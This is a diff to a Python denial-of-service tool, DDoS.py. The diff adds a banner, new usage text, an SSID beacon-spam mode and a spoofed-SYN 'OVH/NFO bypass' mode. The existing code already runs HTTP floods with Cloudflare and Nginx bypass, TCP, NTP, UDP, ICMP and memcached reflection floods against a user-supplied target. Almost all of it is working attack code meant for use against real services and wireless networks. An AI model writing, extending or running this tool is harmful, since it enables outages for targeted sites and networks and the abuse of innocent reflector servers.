@@ -1,3 +1,21 @@
+print("""
+ /$$   /$$                     /$$             /$$$$$$$$              
+| $$$ | $$                    | $$            | $$_____/              
+| $$$$| $$  /$$$$$$   /$$$$$$$| $$   /$$      | $$       /$$$$$$/$$$$ 
+| $$ $$ $$ /$$__  $$ /$$_____/| $$  /$$/      | $$$$$   | $$_  $$_  $$
+| $$  $$$$| $$  \ $$| $$      | $$$$$$/       | $$__/   | $$ \ $$ \ $$
+| $$\  $$$| $$  | $$| $$      | $$_  $$       | $$      | $$ | $$ | $$
+| $$ \  $$|  $$$$$$/|  $$$$$$$| $$ \  $$      | $$$$$$$$| $$ | $$ | $$
+|__/  \__/ \______/  \_______/|__/  \__/      |________/|__/ |__/ |__/
+______________________________________________________________________
+
+    #################### Predator or pray, predator or pray
+    # BossFight 2017   # Nock em out
+    # Sweden           # Nock em out
+    #################### Predator or pray, predator or pray
+    
+    
+    Music: https://www.youtube.com/watch?v=F0PUVKfxkTM""")
 import cloudscraper
 import requests
 import threading
@@ -6,6 +24,7 @@ import random
 import os
 import socket
 import sys
+from threading import Thread
 from scapy.all import *
 from requests.structures import CaseInsensitiveDict
 from time import sleep
@@ -35,12 +54,21 @@ user_agent_list = [
 ]
 website = str(sys.argv[1])
 if website == "-h":
+	os.system("clear")
 	print("""Usage:
-_______________________________________________
+_____________________________________________________________________
+sudo python3 DDoS.py URL/IP/WIFINAME Networks-to-make (for ssid spam)
+_____________________________________________________________________
+
+Examples:
+_____________________________________________________________________
 sudo python3 DDoS.py https://www.target.com 1
-_______________________________________________
+_____________________________________________________________________
 sudo python3 DDoS.py 1.1.1.1 4
-_______________________________________________
+_____________________________________________________________________
+sudo python3 DDoS.py wifiname 9 100
+_____________________________________________________________________
+
 methods: 
 
 1.Nginx
@@ -50,15 +78,22 @@ methods:
 5.NTP
 6.UDP
 7.DNS (memcached packet)
-8.ICMP""")
+8.ICMP
+9.SSID spam
+10.OVH/NFO bypass""")
 	exit()
 url = website
 fff = str(sys.argv[2])
 if int(fff) == 1:
 	while True:
+		os.system("clear")
 		print("""
 Requests sent:
-| """ + str(b)  + """ |""")
+| """ + str(b)  + """ |
+Method:
+| Nginx bypass |
+Website:
+| """ + url + """ |""")
 		b = b + 1
 		for i in range(1,20):
 			user_agent = random.choice(user_agent_list)
@@ -82,7 +117,11 @@ if int(fff) == 3:
 			os.system("clear")
 			print("""
 Requests sent:
-| """ + str(b)  + """ |""")
+| """ + str(b)  + """ |
+Method:
+| GET |
+Website:
+| """ + url + """ |""")
 			rand = 0
 if int(fff) == 4:
 	target_ip = website
@@ -95,7 +134,14 @@ if int(fff) == 4:
 	while True:
 		send(p, verbose=0)
 		test232 = test232 + 1
-		print(str(test232) + " packets sent")
+		os.system("clear")
+		print("""
+Requests sent:
+| """ + str(test232)  + """ |
+Method:
+| TCP |
+IP:
+| """ + url + """ |""")
 if int(fff) == 5:
 	test232 = 0
 	target = website
@@ -105,7 +151,14 @@ if int(fff) == 5:
 	while True:
 		send(packet, verbose=0)
 		test232 = test232 + 1
-		print(str(test232) + " packets sent")
+		os.system("clear")
+		print("""
+Requests sent:
+| """ + str(test232)  + """ |
+Method:
+| NTP |
+IP:
+| """ + url + """ |""")
 	exit()
 if int(fff) == 6:
 	DESTINATION_IP = website
@@ -116,7 +169,14 @@ if int(fff) == 6:
 	test232 = 0
 	while True:
 		test232 = test232 + 1
-		print(str(test232) + " packets sent")
+		os.system("clear")
+		print("""
+Requests sent:
+| """ + str(test232)  + """ |
+Method:
+| UDP |
+IP:
+| """ + url + """ |""")
 		udp_socket.sendto(payload,(DESTINATION_IP,DESTINATION_PORT))
 if int(fff) == 7:
 	test232 = 0
@@ -125,7 +185,14 @@ if int(fff) == 7:
 	payload = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
 	while True:
 		test232 = test232 + 1
-		print(str(test232) + " packets sent")
+		os.system("clear")
+		print("""
+Requests sent:
+| """ + str(test232)  + """ |
+Method:
+| DNS (memcached packet) |
+IP:
+| """ + url + """ |""")
 		send(IP(src=target, dst=ip) / UDP(dport=11211) / Raw(load=payload), count=100, verbose=0)
 if int(fff) == 8:
 	test232 = 0
@@ -133,23 +200,92 @@ if int(fff) == 8:
 		request = IP(dst=url)/ICMP()
 		send(request, verbose=0)
 		test232 = test232 + 1
-		print(str(test232) + " packets sent")
+		os.system("clear")
+		print("""
+Requests sent:
+| """ + str(test232)  + """ |
+Method:
+| ICMP |
+IP:
+| """ + url + """ |""")
+if int(fff) == 9:
+	os.system("sudo airmon-ng check kill")
+	os.system("sudo airmon-ng start wlan0")
+	iface = "wlan0"
+	os.system("clear")
+	a = 0
+	i = 0
+	msggg = website
+	wiii = int(sys.argv[3])
 	
+	def test1():
+		sender_mac = RandMAC()
+		ssid = msggg + str(a)
+		dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
+		beacon = Dot11Beacon()
+		essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+		frame = RadioTap()/dot11/beacon/essid
+		sendp(frame, inter=0.1, iface=iface, loop=1, verbose=False)
+	while i < int(wiii):
+		a = a + 1
+		Thread(target = test1).start() 
+		i = i + 1
+		os.system("clear")
+		print("""
+Requests sent:
+| """ + str(i)  + """ |
+Method:
+| SSID spam |
+Network name:
+| """ + url + """ |""")
+	else:
+		print("Done creating networks")
+		time.sleep(1)
+		os.system("clear")
+		print("""
+Requests sent:
+| """ + str(i)  + """ |
+Method:
+| SSID spam |
+Network name:
+| """ + url + """ |""")
+	time.sleep(100000000)
+if int(fff) == 10:
+	count = 0
+	target = url
+	target_port = 80
+	data = "Get rekt"
+	target_ip = socket.gethostbyname(target)
+	while True:
+		ip = IP(src=target_ip, dst=target_ip) 
+		tcp = TCP(sport=RandShort(), dport=int(target_port), flags="S")
+		raw = Raw(data*1024)
+		p = ip / tcp / raw
+		send(p, loop=0, verbose=0)
+		count = count + 1
+		os.system("clear")
+		print("""
+Requests sent:
+| """ + str(count)  + """ |
+Method:
+| OVH/NFO bypass |
+Website:
+| """ + url + """ |""")
 def check_url(url):
 	try:
 		cloudfare_check_url = requests.Session()
 		response = cloudfare_check_url.get(url)
 		if response.status_code == 200:
-			print("[INFO] The url is valid")
+			print(" ")
 		elif response.status_code == 404:
-			print("[INFO] The url is invalid")
+			print("The url is invalid")
 	except:
 		bypass = cloudscraper.create_scraper()
 		response2 = bypass.get(url)
 		if response2.status_code == 200:
-			print("[INFO]The url is valid")
+			print(" ")
 		elif response2.status_code == 404:
-			print("[INFO] The url is invalid")
+			print("The url is invalid")
 
 count = 0
 
@@ -164,10 +300,24 @@ def bypass(url, threads):
 		while True:
 			response = r.get(url)
 			count +=1
-			print("\n" + f"[ATTACK] Status code: {response.status_code} Request number: {count}" + "\n")
+			os.system("clear")
+			print("""
+Requests sent:
+| """ + str(count)  + """ |
+Method:
+| CLOUDFARE bypass |
+IP:
+| """ + url + """ |""")
 
 			response = bypass2.get(url)
-			print("\n" + f"[ATTACK]Status code: {response.status_code} Request number: {count}" + "\n")
+			os.system("clear")
+			print("""
+Requests sent:
+| """ + str(count)  + """ |
+Method:
+| CLOUDFARE bypass |
+IP:
+| """ + url + """ |""")
 
 	list_of_threads = []
 
